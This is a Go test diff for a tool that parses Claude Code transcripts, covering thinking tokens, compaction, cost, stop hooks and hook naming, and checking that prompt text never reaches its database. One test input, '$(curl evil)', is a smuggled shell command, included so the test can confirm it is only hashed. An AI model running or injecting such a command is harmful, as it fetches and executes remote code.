@@ -1,6 +1,8 @@
 package callmeter
 
 import (
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -537,5 +539,344 @@ func TestTranscriptTurnEnd(t *testing.T) {
 	}
 	if _, err := TranscriptTurnEnd(filepath.Join(t.TempDir(), "absent.jsonl")); !errors.Is(err, fs.ErrNotExist) {
 		t.Errorf("TranscriptTurnEnd on a missing transcript = %v, want an error wrapping fs.ErrNotExist", err)
+	}
+}
+
+// marksFixture is real Claude Code 2.1.289 lines (sanitized): a prompt, two
+// replies carrying output_tokens_details, a stop_hook_summary and the
+// turn_duration after it, a second prompt answered by a reply of an older
+// version with no details, a compact_boundary and two cost-state lines.
+const marksFixture = "testdata/transcript-marks.jsonl"
+
+const (
+	marksPrompt1 = "af8da24f-ac08-45b1-9c9e-b2015b11f360"
+	marksPrompt2 = "11111111-2222-4333-8444-555555555555"
+)
+
+func readMarksFixture(t *testing.T) TranscriptRead {
+	t.Helper()
+	read, err := ReadTranscript(marksFixture, "")
+	if err != nil {
+		t.Fatalf("ReadTranscript: %v", err)
+	}
+	return read
+}
+
+// writeMarksVariant writes the fixture with each of its replacements applied
+// (a value changed in place, never a shape made up) and reads it.
+func readMarksVariant(t *testing.T, replacements ...string) (TranscriptRead, error) {
+	t.Helper()
+	raw, err := os.ReadFile(marksFixture)
+	if err != nil {
+		t.Fatal(err)
+	}
+	text := string(raw)
+	for i := 0; i < len(replacements); i += 2 {
+		if !strings.Contains(text, replacements[i]) {
+			t.Fatalf("fixture lacks %q", replacements[i])
+		}
+		text = strings.Replace(text, replacements[i], replacements[i+1], 1)
+	}
+	path := filepath.Join(t.TempDir(), "main.jsonl")
+	if err := os.WriteFile(path, []byte(text), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	return ReadTranscript(path, "")
+}
+
+func TestReadTranscriptThinkingTokens(t *testing.T) {
+	read := readMarksFixture(t)
+	got := map[string]*int64{}
+	for _, request := range read.Requests {
+		got[request.MessageID] = request.ThinkingTokens
+	}
+	if len(got) != 3 {
+		t.Fatalf("requests = %v, want 3", got)
+	}
+	if v := got["msg_011Cfg5BFXP8ktxFkALGfUL3"]; v == nil || *v != 118 {
+		t.Errorf("thinking of the reply with 118 = %v, want 118", v)
+	}
+	if v := got["msg_011Cfg5GzuUN3vDHbBc86k21"]; v == nil || *v != 0 {
+		t.Errorf("thinking of the reply with an explicit 0 = %v, want 0", v)
+	}
+	if v, ok := got["msg_01ApKzvSCV54JEQyKJBGg11V"]; !ok || v != nil {
+		t.Errorf("thinking of the reply with no output_tokens_details = %v, want nil (a missing count is never zero)", v)
+	}
+	var usage RequestUsage
+	for _, request := range read.Requests {
+		if request.ThinkingTokens != nil && *request.ThinkingTokens == 118 {
+			usage = request.RequestUsage
+		}
+	}
+	var request Request
+	ApplyUsage(&request, usage)
+	if request.ThinkingTokens == nil || *request.ThinkingTokens != 118 {
+		t.Errorf("ApplyUsage thinking = %v, want 118", request.ThinkingTokens)
+	}
+}
+
+func TestReadTranscriptThinkingTokensLastEntryWins(t *testing.T) {
+	entry := func(output, thinking int) string {
+		return fmt.Sprintf(`{"type":"assistant","timestamp":"2026-09-23T01:00:09.000Z","message":{"id":"msg_one","model":"m",`+
+			`"content":[],"usage":{"input_tokens":1,"output_tokens":%d,"output_tokens_details":{"thinking_tokens":%d}}}}`+"\n", output, thinking)
+	}
+	path := filepath.Join(t.TempDir(), "main.jsonl")
+	if err := os.WriteFile(path, []byte(entry(10, 3)+entry(40, 25)), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	read, err := ReadTranscript(path, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(read.Requests) != 1 || read.Requests[0].ThinkingTokens == nil || *read.Requests[0].ThinkingTokens != 25 {
+		t.Fatalf("requests = %+v, want one at thinking 25", read.Requests)
+	}
+}
+
+func TestReadTranscriptCompaction(t *testing.T) {
+	marks := readMarksFixture(t).Marks
+	want := []Compaction{{
+		EntryID: "4c8d0498-fbb2-45a0-b6ac-7279953c4fd7", TS: 1791113158553, Trigger: "auto",
+		PreTokens: Ptr(int64(333677)), PostTokens: Ptr(int64(18677)), CumulativeDroppedTokens: Ptr(int64(315000)), DurationMS: Ptr(int64(72119)),
+	}}
+	if !reflect.DeepEqual(marks.Compactions, want) {
+		t.Fatalf("Compactions = %+v\nwant %+v", marks.Compactions, want)
+	}
+	read, err := readMarksVariant(t, `"trigger":"auto"`, `"trigger":"Not A Label"`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := read.Marks.Compactions[0].Trigger; got != "" {
+		t.Errorf("trigger of the wrong shape = %q, want it dropped", got)
+	}
+}
+
+func TestReadTranscriptCostStateTheLastWins(t *testing.T) {
+	cost := readMarksFixture(t).Marks.Cost
+	want := &CostState{
+		SessionID: "sess-demo", CostUSD: Ptr(59.30682170000001), APIMS: Ptr(int64(9190688)), APINoRetryMS: Ptr(int64(9181361)),
+		ToolMS: Ptr(int64(3682088)), WallMS: Ptr(int64(53062358)), Started: Ptr(int64(1791065248155)),
+		ModelCosts: map[string]float64{"claude-opus-5-5": 45.53485040000004, "claude-sonnet-5-5": 13.771971300000002},
+	}
+	if !reflect.DeepEqual(cost, want) {
+		t.Fatalf("Cost = %+v\nwant %+v", cost, want)
+	}
+	read, err := readMarksVariant(t, `"claude-sonnet-5-5":{`, `"not a model key!":{`,
+		`"claude-sonnet-5-5":{`, `"not a model key!":{`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := read.Marks.Cost.ModelCosts; len(got) != 1 || got["claude-opus-5-5"] != 45.53485040000004 {
+		t.Errorf("model costs with a key of the wrong shape = %v, want only the opus key", got)
+	}
+}
+
+func TestReadTranscriptStopHooks(t *testing.T) {
+	marks := readMarksFixture(t).Marks
+	if len(marks.StopHooks) != 1 {
+		t.Fatalf("StopHooks = %+v, want 1", marks.StopHooks)
+	}
+	hook := marks.StopHooks[0]
+	if hook.EntryID != "8b7a2d0e-b849-4d10-a191-b1cd766d87f3" || hook.PromptID != marksPrompt1 || hook.TS != 1791065682790 ||
+		hook.HookCount != 4 || hook.HookErrors != 0 {
+		t.Errorf("stop hook = %+v", hook)
+	}
+	type run struct {
+		name     string
+		bytes    int64
+		duration *int64
+	}
+	var got []run
+	for _, h := range hook.Hooks {
+		got = append(got, run{h.Name, h.CommandBytes, h.DurationMS})
+	}
+	want := []run{
+		{"notify.sh", int64(len("$CLAUDE_PROJECT_DIR/.claude/scripts/notify.sh stop")), Ptr(int64(139))},
+		{"guard-stamp.sh", int64(len("$CLAUDE_PROJECT_DIR/.claude/scripts/guard-stamp.sh stop")), Ptr(int64(66))},
+		{"codex-sync.sh", int64(len("$CLAUDE_PROJECT_DIR/.claude/scripts/codex-sync.sh sync")), Ptr(int64(30))},
+		{"callmeter", int64(len("${CLAUDE_PLUGIN_ROOT}/libexec/callmeter hook")), nil},
+	}
+	if !reflect.DeepEqual(got, want) {
+		t.Errorf("hook runs = %+v\nwant %+v", got, want)
+	}
+	read, err := readMarksVariant(t, `"hookErrors":[]`, `"hookErrors":["placeholder","placeholder"]`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if n := read.Marks.StopHooks[0].HookErrors; n != 2 {
+		t.Errorf("HookErrors with two listed = %d, want 2", n)
+	}
+}
+
+func TestReadTranscriptTurnDurationTakesThePrecedingPrompt(t *testing.T) {
+	marks := readMarksFixture(t).Marks
+	want := []TurnDuration{{
+		EntryID: "463cc8cc-6d27-4c84-b49d-06fa061a443b", TS: 1791065682814, PromptID: marksPrompt1,
+		DurationMS: Ptr(int64(81557)), MessageCount: Ptr(int64(60)), BackgroundAgents: Ptr(int64(4)),
+	}}
+	if !reflect.DeepEqual(marks.TurnDurations, want) {
+		t.Fatalf("TurnDurations = %+v\nwant %+v", marks.TurnDurations, want)
+	}
+}
+
+func TestReadTranscriptMarkLineRules(t *testing.T) {
+	// An entry with no uuid is no mark.
+	read, err := readMarksVariant(t, `"uuid":"4c8d0498-fbb2-45a0-b6ac-7279953c4fd7"`, `"nouuid":"x"`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(read.Marks.Compactions) != 0 {
+		t.Errorf("a compact_boundary with no uuid gave %+v", read.Marks.Compactions)
+	}
+	raw, err := os.ReadFile(marksFixture)
+	if err != nil {
+		t.Fatal(err)
+	}
+	lines := strings.SplitAfter(string(raw), "\n")
+	var turn string
+	for _, line := range lines {
+		if strings.Contains(line, `"turn_duration"`) {
+			turn = line
+		}
+	}
+	cutTurn := turn[:strings.Index(turn, "turn_duration")+20] // names the mark, ends inside it
+	dir := t.TempDir()
+	// A partial last mark line is a writer mid-append: skipped.
+	partial := filepath.Join(dir, "partial.jsonl")
+	if err := os.WriteFile(partial, []byte(strings.Join(lines, "")+cutTurn), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := ReadTranscript(partial, ""); err != nil {
+		t.Errorf("a partial last mark line: %v, want it skipped", err)
+	}
+	// Any other malformed mark line is an error naming the path.
+	malformed := filepath.Join(dir, "malformed.jsonl")
+	if err := os.WriteFile(malformed, []byte(cutTurn+"\n"+strings.Join(lines, "")), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := ReadTranscript(malformed, ""); err == nil || !strings.Contains(err.Error(), malformed) {
+		t.Errorf("a malformed mark line: %v, want an error naming %s", err, malformed)
+	}
+}
+
+func TestHookName(t *testing.T) {
+	sum := func(command string) string {
+		digest := sha256.Sum256([]byte(command))
+		return "#" + hex.EncodeToString(digest[:])[:8]
+	}
+	for command, want := range map[string]string{
+		"$CLAUDE_PROJECT_DIR/.claude/scripts/notify.sh stop":      "notify.sh",
+		"${CLAUDE_PLUGIN_ROOT}/libexec/callmeter hook":            "callmeter",
+		"/usr/local/bin/tool":                                     "tool",
+		"CALLMETER_HOME=/tmp/x FOO=1 ${CLAUDE_PLUGIN_ROOT}/bin/x": "x",
+		`"/opt/hooks/stop.sh" --flag`:                             "stop.sh",
+		"bash /opt/hooks/after-turn.sh":                           "after-turn.sh",
+		"sh -e /opt/hooks/after-turn.sh arg":                      "after-turn.sh",
+		"python3 -u /opt/hooks/summarize.py":                      "summarize.py",
+		"uv run scripts/gate.py":                                  "gate.py",
+		"node":                                                    "node",
+		"":                                                        "#e3b0c442",
+		"$(curl evil)":                                            sum("$(curl evil)"),
+		"/opt/hooks/wé.sh":                                        sum("/opt/hooks/wé.sh"),
+		"./" + strings.Repeat("a", 65):                            sum("./" + strings.Repeat("a", 65)),
+		"CALLMETER_HOME=/tmp/x":                                   sum("CALLMETER_HOME=/tmp/x"),
+		"$CLAUDE_PROJECT_DIR/.claude/scripts/guard-stamp.sh stop": "guard-stamp.sh",
+		"$CLAUDE_PROJECT_DIR/.claude/scripts/codex-sync.sh sync":  "codex-sync.sh",
+		"npx prettier --check .":                                  "npx",
+		"python3 hook.py":                                         "hook.py",
+		"/opt/hooks/Tool":                                         sum("/opt/hooks/Tool"),
+		"terminal-notifier -message done":                         sum("terminal-notifier -message done"),
+		// Free prose never yields a word of itself.
+		"I want to verify the change before stopping": sum("I want to verify the change before stopping"),
+		"Check":         sum("Check"),
+		"check it now":  sum("check it now"),
+		"Node.js first": sum("Node.js first"),
+	} {
+		if got := HookName(command); got != want {
+			t.Errorf("HookName(%q) = %q, want %q", command, got, want)
+		}
+	}
+}
+
+// A prompt-type hook (its entry carries promptText, its command the prompt
+// itself) and a command that reads as prose are named prompt# and a hash: no
+// word of the prompt reaches any table. Invented prompt text only.
+func TestPromptHookNeverStoresItsText(t *testing.T) {
+	const prompt = "Zebrafinch wants the quokka ledger reconciled before this turn ends, then a short marmoset summary."
+	const prose = "Please confirm the wombat tally"
+	async := `{"command":"${CLAUDE_PLUGIN_ROOT}/libexec/callmeter hook"}`
+	read, err := readMarksVariant(t, async, async+
+		`,{"command":"`+prompt+`","durationMs":5058,"promptText":"`+prompt+`"},{"command":"`+prose+`","durationMs":12}`)
+	if err != nil {
+		t.Fatalf("ReadTranscript: %v", err)
+	}
+	sum := func(command string) string {
+		digest := sha256.Sum256([]byte(command))
+		return "prompt#" + hex.EncodeToString(digest[:])[:8]
+	}
+	var names []string
+	for _, run := range read.Marks.StopHooks[0].Hooks {
+		names = append(names, run.Name)
+	}
+	if want := []string{"notify.sh", "guard-stamp.sh", "codex-sync.sh", "callmeter", sum(prompt), sum(prose)}; !reflect.DeepEqual(names, want) {
+		t.Fatalf("hook names = %v, want %v", names, want)
+	}
+	if got := read.Marks.StopHooks[0].Hooks[4].CommandBytes; got != int64(len(prompt)) {
+		t.Errorf("prompt hook command_bytes = %d, want %d", got, len(prompt))
+	}
+	store := openTestStore(t)
+	putMarks(t, store, "", 5000, read.Marks)
+	words := map[string]bool{}
+	for _, word := range strings.Fields(prompt + " " + prose) {
+		words[strings.Trim(word, ",.")] = true
+	}
+	tables, err := store.DB().Query("SELECT name FROM sqlite_master WHERE type = 'table'")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var names2 []string
+	for tables.Next() {
+		var name string
+		if err := tables.Scan(&name); err != nil {
+			t.Fatal(err)
+		}
+		names2 = append(names2, name)
+	}
+	if err := errors.Join(tables.Err(), tables.Close()); err != nil {
+		t.Fatal(err)
+	}
+	for _, table := range names2 {
+		rows, err := store.DB().Query("SELECT * FROM " + table)
+		if err != nil {
+			t.Fatal(err)
+		}
+		columns, err := rows.Columns()
+		if err != nil {
+			t.Fatal(err)
+		}
+		for rows.Next() {
+			values := make([]any, len(columns))
+			pointers := make([]any, len(columns))
+			for i := range values {
+				pointers[i] = &values[i]
+			}
+			if err := rows.Scan(pointers...); err != nil {
+				t.Fatal(err)
+			}
+			for i, value := range values {
+				text := fmt.Sprint(value)
+				if b, ok := value.([]byte); ok {
+					text = string(b)
+				}
+				for _, word := range strings.FieldsFunc(text, func(r rune) bool { return !(r >= 'A' && r <= 'Z' || r >= 'a' && r <= 'z') }) {
+					if words[word] && len(word) > 4 || text == "Zebrafinch" || text == "Please" {
+						t.Errorf("%s.%s holds the prompt word %q: %q", table, columns[i], word, text)
+					}
+				}
+			}
+		}
+		if err := errors.Join(rows.Err(), rows.Close()); err != nil {
+			t.Fatal(err)
+		}
 	}
 }
